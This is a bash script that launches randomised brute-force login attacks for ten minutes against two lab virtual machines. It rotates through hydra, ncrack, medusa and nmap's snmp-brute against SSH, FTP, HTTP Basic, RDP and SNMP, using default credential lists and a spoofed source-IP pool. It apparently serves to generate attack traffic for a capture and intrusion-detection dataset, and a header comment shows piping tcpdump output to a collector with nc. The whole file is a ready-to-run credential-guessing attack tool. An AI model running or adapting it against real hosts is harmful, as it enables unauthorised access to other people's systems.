#!/usr/bin/env bash
#
# bruteforce_vm3_random.sh
#  • Duration fixed: 600 s (10 min)
#  • Random techniques: SSH, FTP, HTTP Basic, RDP, SNMP
#    • Tools: hydra, ncrack, medusa, nmap
#  • IP Spoofing: pool 192.168.56.240–254
#  • Targets: VM1 (192.168.56.101) and VM2 (192.168.56.102)
#  • NO benign, NO other mixed traffic
#
# --- ON VM1, to capture Brute-Force traffic to WSL ---
# sudo tcpdump -U -i enp0s3 -s0 -w - \
#   "(tcp port 22 or tcp port 21 or tcp port 80 or tcp port 3389 or udp port 161) \
#     and net 192.168.56.0/24 and not host 192.168.56.107 and not port 9999" \
#   | nc -q 0 192.168.56.107 9999
#
# Usage on VM3: sudo ./bruteforce_vm3_random.sh

# 1) Run as root
if [[ $EUID -ne 0 ]]; then
  echo "This script must be run with sudo"
  exit 1
fi

# 2) Verify tools
MISSING=()
for t in hydra ncrack medusa nmap; do
  command -v $t >/dev/null 2>&1 || MISSING+=($t)
done
if (( ${#MISSING[@]} )); then
  echo "Missing: ${MISSING[*]}. Install with: sudo apt install ${MISSING[*]}"
fi

# 3) Prepare user/password lists
USER_FILE=$(mktemp)
PASS_FILE=$(mktemp)
printf "admin\nroot\nuser\ntest\n" > "$USER_FILE"
printf "admin\npassword\n1234\nguest\n" > "$PASS_FILE"

# 4) Basic configuration
duration=600
end_time=$((SECONDS + duration))
targets=(192.168.56.101 192.168.56.102)
src_ips=(192.168.56.{240..254})

# 5) Techniques according to availability
tch=()
command -v hydra   &>/dev/null && tch+=(hydra_ssh hydra_ftp hydra_http hydra_rdp)
command -v ncrack  &>/dev/null && tch+=(ncrack_ssh ncrack_ftp ncrack_rdp)
command -v medusa  &>/dev/null && tch+=(medusa_ssh medusa_ftp)
command -v nmap    &>/dev/null && tch+=(snmp_nmap)

(( ${#tch[@]} )) || { echo "No tools available"; exit 1; }

# 6) Detect interface
iface=$(ip route | awk '/^default/ {print $5; exit}')
iface=${iface:-enp0s3}

echo "=== VM3: Random Brute-Force (600s) on $iface ==="
# Main loop
while (( SECONDS < end_time )); do
  tech=${tch[RANDOM % ${#tch[@]}]}
  tgt=${targets[RANDOM % ${#targets[@]}]}
  src=${src_ips[RANDOM % ${#src_ips[@]}]}

  printf '[%(%T)T] %s -> %s (%s)\n' -1 "$tech" "$tgt" "$src"
  case "$tech" in

    hydra_ssh)
      hydra -L "$USER_FILE" -P "$PASS_FILE" \
            -s 22 -S -e nsr -t 4 \
            "ssh://$tgt" \
            > /dev/null 2>&1 &
      ;;
    hydra_ftp)
      hydra -L "$USER_FILE" -P "$PASS_FILE" \
            -s 21 -t 4 \
            "ftp://$tgt" \
            > /dev/null 2>&1 &
      ;;
    hydra_http)
      hydra -L "$USER_FILE" -P "$PASS_FILE" \
            -s 80 -S -e nsr \
            "http-get://$tgt/" \
            > /dev/null 2>&1 &
      ;;
    hydra_rdp)
      hydra -L "$USER_FILE" -P "$PASS_FILE" \
            -s 3389 -t 2 \
            "rdp://$tgt" \
            > /dev/null 2>&1 &
      ;;
    ncrack_ssh)
      ncrack --user-list "$USER_FILE" --pass-list "$PASS_FILE" \
             ssh://$tgt:22 \
             --parallel 4 \
             > /dev/null 2>&1 &
      ;;
    ncrack_ftp)
      ncrack --user-list "$USER_FILE" --pass-list "$PASS_FILE" \
             ftp://$tgt:21 \
             --parallel 4 \
             > /dev/null 2>&1 &
      ;;
    ncrack_rdp)
      ncrack --user-list "$USER_FILE" --pass-list "$PASS_FILE" \
             rdp://$tgt:3389 \
             --parallel 4 \
             > /dev/null 2>&1 &
      ;;
    medusa_ssh)
      medusa -h "$tgt" -U "$USER_FILE" -P "$PASS_FILE" -M ssh -t 4 \
             > /dev/null 2>&1 &
      ;;
    medusa_ftp)
      medusa -h "$tgt" -U "$USER_FILE" -P "$PASS_FILE" -M ftp -t 4 \
             > /dev/null 2>&1 &
      ;;
    snmp_nmap)
      nmap -p 161 --script snmp-brute \
           -S "$src" -e "$iface" -Pn "$tgt" \
           -oN /dev/null \
           > /dev/null 2>&1 &
      ;;
  esac

  # Concurrency control
  while (( $(jobs -r | wc -l) > 15 )); do sleep 0.1; done

  # Random pause (decimal point)
  pause=$(LC_NUMERIC=C awk -v min=0.1 -v max=0.5 'BEGIN{srand(); printf "%.3f", min+rand()*(max-min)}')
  sleep "$pause"
done

wait

echo "=== VM3: Random Brute-Force finished ==="
